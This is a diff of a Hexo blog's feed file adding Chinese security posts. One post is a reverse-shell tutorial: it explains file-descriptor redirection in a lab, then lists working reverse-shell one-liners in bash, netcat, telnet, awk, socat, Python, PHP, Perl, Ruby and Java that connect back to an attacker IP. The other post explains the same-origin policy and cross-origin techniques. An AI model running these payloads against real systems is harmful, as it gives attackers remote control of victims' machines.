+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#攻击机输入</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">hello world</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32964</span><br><span class="line">I am a good boy</span><br><span class="line"></span><br><span class="line"><span class="comment">#靶机接收</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># cat &lt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line">hello world</span><br><span class="line">I am a good boy</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>交互重定向</strong></li>
+</ul>
+<p>把上述的两个命令组合起来并使用重定向：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333</span><br></pre></td></tr></table></figure>
+<p>这样就把靶机的shell的标准输出和标准错误给重定向到了攻击机上，这时候我们靶机上已经无法显示东西，但是仍然能够输入命令（只是在靶机上看不见），而命令输出的结果在攻击机上显示。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221535454.png" alt="image-20210325221535454"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325221526338.png" alt="image-20210325221526338"></p>
+<p>这样还不够，攻击机还需要获得靶机的输入控制权，于是可以在命令的末尾加上把标准输入<code>stdin0</code>重定向到标准输出或者标准错误输出所指向的文件即可：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="常见利用语句"><a href="#常见利用语句" class="headerlink" title="常见利用语句"></a>常见利用语句</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 &lt;&amp;2</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>文件的读/写打开方式对于文件描述符来讲并没有什么区别</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>解释：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.91.128/2333;</span><br></pre></td></tr></table></figure>
+<p>这一句将文件描述符5重定向到了 <code>/dev/tcp/192.168.91.128/2333</code> 并且方式是<strong>读写方式</strong>，于是我们就能通过文件描述符对这个socket连接进行操作了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p>首先从文件描述符5中读取传过来的命令，通过管道符传到后面的命令，从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。并将操作结果的标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223538469.png" alt="image-20210325223538469"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325223556753.png" alt="image-20210325223556753"></p>
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p>nc如果版本是有 -e 选项的话就能够直接反弹shell，出于安全原因，Ubuntu自带的nc是不带这个选项的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.91.128 2333</span><br></pre></td></tr></table></figure>
+<p>如果没有 -e 选项的话还可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.91.128 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
+<p>example:</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115210794.png" alt="image-20210326115210794"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326115224913.png" alt="image-20210326115224913"></p>
+<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>攻击机上打开两个终端分别执行监听：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
+<p>靶机中执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.91.128 4444 | /bin/bash | telnet 192.168.91.128 5555</span><br></pre></td></tr></table></figure>
+<p>从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。</p>
+<p>example：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121226183.png" alt="image-20210326121226183"></p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210326121243836.png" alt="image-20210326121243836"></p>
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.91.128/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.91.128:2333</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.91.128&#x27;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.91.128&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.99.242&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;192.168.91.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>当我们使用Ubuntu作为服务器，是无法直接通过使用命令执行的函数如<code>system()</code>等去执行<code>bash</code>命令，会显示<code>sh: 1: Syntax error: Bad fd number</code>，这个错误在centos中是不会出现的，这是因为ubuntu从6.10开始，默认使用dash（登录还是用bash），因为dash更快更高效。只要把bash链接到sh即可。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20190115161623.png" alt="img"></p>
+<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>由于把Window作为服务器比较少见，在加上里面很多东西我也没见过，这里贴个链接，以备不时之需。</p>
+<p><a class="link"   href="https://lipeilipei.top/2020/10/01/windows%E5%8F%8D%E5%BC%B9shell/" >Windows 反弹 shell<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://xz.aliyun.com/t/2548" >Linux反弹shell（一）文件描述符与重定向<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://xz.aliyun.com/t/2549#toc-10" >Linux 反弹shell（二）反弹shell的本质<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>反弹shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/2020/12/18/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
@@ -891,6 +1243,179 @@
       <categories>
         <category>杂谈</category>
       </categories>
+  </entry>
+  <entry>
+    <title>同源策略</title>
+    <url>/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
+    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个<a class="link"   href="https://developer.mozilla.org/en-US/docs/Glossary/Origin" >origin<i class="fas fa-external-link-alt"></i></a>的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
+<h2 id="源的定义"><a href="#源的定义" class="headerlink" title="源的定义"></a>源的定义</h2><p>如果两个URL拥有相同的<strong>协议（http、https）、端口和主机</strong>，那么这两个URL就是同源的。</p>
+<p>example：</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>是否同源</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a class="link"   href="http://store.company.com/dir/page.html" >http://store.company.com/dir/page.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>base</td>
+<td></td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com/dir2/other.html" >http://store.company.com/dir2/other.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com/dir/inner/another.html" >http://store.company.com/dir/inner/another.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="https://store.company.com/secure.html" >https://store.company.com/secure.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com:81/dir/etc.html" >http://store.company.com:81/dir/etc.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://news.company.com/dir/other.html" >http://news.company.com/dir/other.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>主机不同</td>
+</tr>
+</tbody></table>
+<p>对于<code>about:blank</code>和<code>javascript:</code>这种特殊的 URL，他们的源应当是继承自加载他们的页面的源，他们本身并没有『源』的概念。</p>
+<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
+<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
+<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
+<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
+<h3 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h3><p>同源策略限制非同源的三种行为：</p>
+<ul>
+<li><p>Cookie、LocalStorage 和 IndexDB 无法读取。</p>
+</li>
+<li><p>DOM 无法获得。</p>
+</li>
+<li><p>AJAX 请求不能发送。</p>
+</li>
+</ul>
+<h2 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h2><p>我们已经知道了，浏览器会根据同源策略允许或拒绝加载某些资源，但是又一个问题由此而生，我们的网站通常会将静态文件（<code>CSS</code>,<code>JS</code>, 图片）等放置在 CDN 上，那么 CDN 与当前域必然是不同源的，但是神奇的是，这些网站可以正常加载出他们需要的资源并展示给用户，这里为什么又不受同源策略的影响呢？</p>
+<p>同源策略控制不同源之间的交互，例如在使用<code>XMLHttpRequest</code> 或<code>&lt;img&gt;</code>标签时则会受到同源策略的约束。这些交互通常分为三类：</p>
+<ul>
+<li><p>跨域<strong>写操作</strong>（Cross-origin writes）一般是被允许的。例如链接（links），重定向以及表单提交。</p>
+</li>
+<li><p>跨域<strong>资源嵌入</strong>（Cross-origin embedding）一般是被允许。</p>
+</li>
+<li><p>跨域<strong>读操作</strong>（Cross-origin reads）一般是<strong>不被允许的</strong>，但常可以通过内嵌资源来巧妙的进行读取访问。</p>
+</li>
+</ul>
+<p>以下是可能嵌入跨源的资源的一些示例：</p>
+<ul>
+<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
+<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
+<li><code>&lt;img&gt;</code> / <code>&lt;video&gt;</code> / <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
+<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
+<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
+<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
+</ul>
+<h3 id="1、具备src的标签"><a href="#1、具备src的标签" class="headerlink" title="1、具备src的标签"></a>1、具备src的标签</h3><ul>
+<li>原理：所有具有<code>src</code>属性的HTML标签都是可以跨域的</li>
+</ul>
+<p>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>和<code>&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p>
+<h3 id="2、JSONP跨域"><a href="#2、JSONP跨域" class="headerlink" title="2、JSONP跨域"></a>2、JSONP跨域</h3><ul>
+<li>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数</li>
+</ul>
+<p><code>&lt;script&gt;</code>标签是可以加载异域的JavaScript并执行的，通过预先设定好的<strong>callback</strong>函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
+<p>a网站的前端代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b网站的后台代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
+<h3 id="3、跨域资源共享（CORS）"><a href="#3、跨域资源共享（CORS）" class="headerlink" title="3、跨域资源共享（CORS）"></a>3、跨域资源共享（CORS）</h3><ul>
+<li>原理：服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</li>
+</ul>
+<p>CORS是HTML5标准提出的跨域资源共享(Cross Origin Resource Share)，支持GET、POST等所有HTTP请求。CORS需要服务器端设置<code>Access-Control-Allow-Origin</code>头，否则浏览器会因为安全策略拦截返回的信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *              # 允许所有域名访问，或者</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;a.com   # 只允许所有域名访问</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="4、document-domain"><a href="#4、document-domain" class="headerlink" title="4、document.domain"></a>4、document.domain</h3><ul>
+<li>原理：相同主域名不同子域名下的页面，可以设置document.domain让它们同域</li>
+</ul>
+<p>我们只需要在跨域的两个页面中设置document.domain就可以了。修改document.domain的方法只适用于不同子域的框架间的交互，要载入iframe页面。</p>
+<p>example：</p>
+<ol>
+<li>在页面 <a class="link"   href="http://a.example.com/a.html" >http://a.example.com/a.html<i class="fas fa-external-link-alt"></i></a> 设置document.domain</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span> = <span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://b.example.com/b.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;test()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;<span class="comment">//设置成主域</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="built_in">document</span>.getElementById(<span class="string">&#x27;￼iframe&#x27;</span>).contentWindow);</span></span><br><span class="line"><span class="javascript">        <span class="comment">//contentWindow 可取得子窗口的 window 对象</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>在页面 <a class="link"   href="http://b.example.com/b.html" >http://b.example.com/b.html<i class="fas fa-external-link-alt"></i></a> 中设置document.domain</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">&#x27;example.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//在iframe载入这个页面也设置document.domain，使之与主页面的document.domain相同</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="5、window-name"><a href="#5、window-name" class="headerlink" title="5、window.name"></a>5、window.name</h3><ul>
+<li>原理：window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的。</li>
+</ul>
+<p>这里有三个页面：</p>
+<ul>
+<li>sever.com/a.html 数据存放页面</li>
+<li>agent.com/b.html 数据获取页面</li>
+<li>agent.com/c.html 空页面，做代理使用</li>
+</ul>
+<p>a.html中，设定<code>window.name</code>作为需要传递的值</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.name = <span class="string">&#x27;I was there!&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">window</span>.name);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b.html中，当iframe加载后将iframe的<code>src</code>指向同域的<code>c.html</code>，这样就可以利用<code>iframe.contentWindow.name</code>获取要传递的值了</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">  iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  iframe.style.display = <span class="string">&#x27;none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> state = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">  iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(state === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(iframe.contentWindow.name);</span></span><br><span class="line">      alert(data);</span><br><span class="line"><span class="javascript">      iframe.contentWindow.document.write(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line">      iframe.contentWindow.close();</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.body.removeChild(iframe);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(state === <span class="number">0</span>) &#123;</span></span><br><span class="line">      state = 1;</span><br><span class="line"><span class="javascript">      iframe.contentWindow.location = <span class="string">&#x27;http://agent.com/c.html&#x27;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  iframe.src = <span class="string">&#x27;http://sever.com/a.html&#x27;</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="6、window-postMesage"><a href="#6、window-postMesage" class="headerlink" title="6、window.postMesage"></a>6、window.postMesage</h3><ul>
+<li>原理: HTML5新增的postMessage方法，通过postMessage来传递信息，对方可以通过监听message事件来监听信息。可跨主域名及双向跨域。</li>
+</ul>
+<p>这里有两个页面：</p>
+<ol>
+<li>agent.com/index.html</li>
+<li>server.com/remote.html</li>
+</ol>
+<p>本地代码index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;proxy&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://server.com/remote.html&quot;</span> <span class="attr">onload</span> = <span class="string">&quot;postMsg()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = &#123;  </span></span><br><span class="line"><span class="javascript">            msg: <span class="string">&#x27;hello world&#x27;</span>  </span></span><br><span class="line">        &#125;  </span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">postMsg</span> (<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;proxy&#x27;</span>);  </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> win = iframe.contentWindow;  </span></span><br><span class="line"><span class="javascript">            win.postMessage(obj,<span class="string">&#x27;http://server.com&#x27;</span>);  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>postMessage</code>的使用方法： otherWindow.postMessage(message, targetOrigin);</p>
+<ul>
+<li>otherWindow: 指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</li>
+<li>message: 是要发送的消息，类型为 String、Object (IE8、9 不支持)</li>
+<li>targetOrigin: 是限定消息接收范围，不限制请使用 <code>*</code></li>
+</ul>
